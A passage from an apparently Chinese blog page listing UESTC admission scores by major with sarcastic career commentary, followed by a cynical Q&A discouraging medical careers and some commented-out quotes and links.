<td style="text-align: center;">686.00</td>
<td style="text-align: center;">683.10</td>
<td style="text-align: center;">681.00</td>
<td>计院还互联网+复合就离谱</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTM1">互联网金融(“互联网＋”复合培养实验班)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">680.00</td>
<td style="text-align: center;">676.30</td>
<td style="text-align: center;">672.00</td>
<td>听这名字就像诈骗窝子</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTI1">航空航天类(航空电子及控制、无人驾驶航空器技术)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">671.00</td>
<td style="text-align: center;">670.30</td>
<td style="text-align: center;">670.00</td>
<td>航天学院，原来有国防生的，现在无了。航天研究所待遇略惨，快跑.jpg</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTI0">工科试验班(智能仪器、智能控制)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">672.00</td>
<td style="text-align: center;">669.80</td>
<td style="text-align: center;">669.00</td>
<td>就自动化的控制和仪器呗（看到智能之类的字眼直接忽略）</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTI5">工科试验班(新材料、新能源与电子化学)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">669.00</td>
<td style="text-align: center;">664.00</td>
<td style="text-align: center;">661.00</td>
<td>天坑材料，钙钛矿，快跑.jpg</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTIy">工科试验班(机器人、电气信息、智能制造)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">677.00</td>
<td style="text-align: center;">671.10</td>
<td style="text-align: center;">670.00</td>
<td>机电，不如西南交大机械（快跑.jpg）</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTI3">工科试验班(电子信息与地球科学复合培养)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">670.00</td>
<td style="text-align: center;">665.50</td>
<td style="text-align: center;">663.00</td>
<td>资环，有些搞GIS和遥感的，不如隔壁西南交大测绘，快跑.jpg</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTM0">工科试验班(电子工程类)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">684.00</td>
<td style="text-align: center;">674.80</td>
<td style="text-align: center;">671.00</td>
<td>老电工</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTI4">电子信息类(智能感知、光通信与显示、智慧照明)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">672.00</td>
<td style="text-align: center;">670.30</td>
<td style="text-align: center;">669.00</td>
<td>圣光电（加老通信光纤）</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTM2">电子信息类(信息与通信)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">687.00</td>
<td style="text-align: center;">676.00</td>
<td style="text-align: center;">673.00</td>
<td>老通信（现信通）</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTMw">电子信息类(电子信息与物理科学复合培养)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">680.00</td>
<td style="text-align: center;">671.80</td>
<td style="text-align: center;">670.00</td>
<td>老物电（现物理）</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTM3">电子信息类(“成电英才计划”拔尖创新人才实验班)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">693.00</td>
<td style="text-align: center;">687.70</td>
<td style="text-align: center;">686.00</td>
<td>英才（提前批）</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTIz">软件工程(国家示范性软件学院)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">665.00</td>
<td style="text-align: center;">659.20</td>
<td style="text-align: center;">656.00</td>
<td>孤儿沙河(毕业薪资掉打除计院外所有)</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTIz">软件工程(“互联网＋”培养实验班)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">670.00</td>
<td style="text-align: center;">667.00</td>
<td style="text-align: center;">66</td>
<td>孤儿沙河</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTE4">临床医学<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">667.00</td>
<td style="text-align: center;">662.50</td>
<td style="text-align: center;">659.00</td>
<td>沙河（实际在清水河上课）</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTIz">集成电路设计与集成系统(国家示范性微电子学院)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">670.00</td>
<td style="text-align: center;">663.70</td>
<td style="text-align: center;">662.00</td>
<td>沙河（已经搬清水河去了）大微固亡了.jpg，想搞芯片报这个</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTE4">护理学<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">636.00</td>
<td style="text-align: center;">623.60</td>
<td style="text-align: center;">618.00</td>
<td>沙河（实际在清水河）</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTIx">电子信息类(中外合作办学)(通信、微电子)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">662.00</td>
<td style="text-align: center;">647.80</td>
<td style="text-align: center;">643.00</td>
<td>沙河（一直都在清水河) 土豪格院</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTIx">电子信息类(中外合作办学)(电子信息)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">665.00</td>
<td style="text-align: center;">651.30</td>
<td style="text-align: center;">646.00</td>
<td>沙河（一直都在清水河）土豪格院</td>
</tr>
</tbody>
</table>
<p>所谓的"互联网+"是和“大众创新，万众创业”、OFO小黄车、区块链一个时期的骗钱概念（大概就15、16、17年吧），直接无视就好了。</p>
<h2 id="qa">Q&amp;A</h2>
<p>Q：你们这帮人整天劝退某些行业没人了怎么办？<br />
A：没人了那不是更好吗。</p>
<p>Q：这次疫情后医护人员待遇会改善吗？<br />
A：这次疫情后，医保缺口更大了，那待遇当然会更差了。 地方财政没钱了，不委屈你们一下怎么行，总不能饿着王公贵胄吧</p>
<p>Q: 我想报考/入坑医学信息、医疗器械，能不能推荐........<br />
A：我推荐你快跑</p>
<p>Q: 那学医呢........<br />
A：去问医生和医学生吧</p>
<p>Q：国外, 怎么样？<br />
A：国外不了解。去问别人吧。</p>
<p>Q：听说这些行业很有前<del>钱</del>途.....<br />
A：前途是用你这样的韭菜和炮灰铺的路，钱是敲骨吸髓压榨患者来的</p>
<p>Q: 什么时候写完？还会更新吗？<br />
A: 毕业之前可能会写完吧。不排除当老鸽子的可能。</p>
<p>Q: 长寿和永生..<br />
A: 老而不死是为贼。活个几十岁差不多得了。</p>
<!-- 
科研穷三代，读博毁一生

https://kknews.cc/zh-my/education/x4ngnqo.html

如何看待中国科学技术大学合并安徽省立医院一事？ - 贱贱的回答 - 知乎
https://www.zhihu.com/question/67131138/answer/249650160 -->
<h2 id="阅读更多">阅读更多</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI5NjkxNTM1L2Fuc3dlcnMvdXBkYXRlZA==">如何看待本科护理专业?<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI4Mjk2MzY3NC9hbnN3ZXJzL3VwZGF0ZWQ=">去 985 学护理，这真的好吗？<i class="fa fa-external-link-alt"></i></span></p>
<p>https://zh.wikipedia.org/wiki/舍恩事件</p>
<!-- 

预防口腔麻醉检验公卫影像

从统计学角度，meta 分析的实际意义在哪里，几年前 meta 热于循证医学，这个报道反映了哪些弊端？ - 大名顶顶的回答 - 知乎 https://www.zhihu.com/question/264789460/answer/286666881

13线医生抠着脚表示医学论文什么统计方法都不重要，因为论文本身就没有任何实际作用，除了卖自己的药/操作，以及打压对手。

我根本不关心学术，自己署名的论文不多，但一直没有忘记其实真正的任务是站街卖银，啊不对，当枪手。凭空代写，中翻英丢SCI，从SCI抄下来改一改英翻中投国内，挣点外快玩玩。全是假数据。客户主要两类，药代和不上不下的老医生。药代就是卖药卖器械，医生就是晋升和装X。



中医能发展成为循证医学吗？ - 「已注销」的回答 - 知乎 https://www.zhihu.com/question/265223414/answer/291460603

以你们中医学生"统计就是求个平均值"的知识水平来说当然做不了随机对照实验。
[https://clinicaltrials.gov/ct2/show/NCT03313778](https://link.zhihu.com/?target=https%3A//clinicaltrials.gov/ct2/show/NCT03313778)
这才是真正的个体化治疗，把每个人自己的癌细胞拿出来测序，做出一个只适用于这个人的药打回去调动免疫系统防癌症扩散，每个人用的都是一个新的分子新的序列，比你们拿一堆草草矿矿线性组合不知道个体化到哪里去了。人家做得，你们做不得？
根本不存在不能做，无非不想做，不敢做，不会做。非蠢即坏而已，不要找借口。

预检分诊

分诊台

全科医生

生化环材大举入侵

名校名牌生化环材也劝退吗？ - 咖喱鸡的回答 - 知乎
https://www.zhihu.com/question/401708377/answer/1294784929

 -->
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/c3JjPTExJmFtcDt0aW1lc3RhbXA9MTYxMjk0OTc5MiZhbXA7dmVyPTI4ODImYW1wO3NpZ25hdHVyZT15QlU2d1dNaGczdGFTSFNVUVJJaThzNEVhSW54RkxoTk9sTU02a1pXMUxoQXYwN1JvcGNKajRFZVBmSnNTYXB0YipQMjJNTGNDLSpkWVRrSkpnbXE4STFQMyptQmZiTkltMlNpUHlFRy04QVVlQmJkdGFWa0Y3STI0UThXbXhBdQ==">花了上千万买的病历系统，为什么永远这么难用？<i class="fa fa-external-link-alt"></i></span><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>https://www.zhihu.com/question/26246543/answer/32440410<a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzUzOTM0OTUy">电子科技大学医学院具体情况是什么？<i class="fa fa-external-link-alt"></i></span><a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>荒废的老本行</category>
      </categories>
      <tags>
        <tag>医疗</tag>
      </tags>
  </entry>
</search>
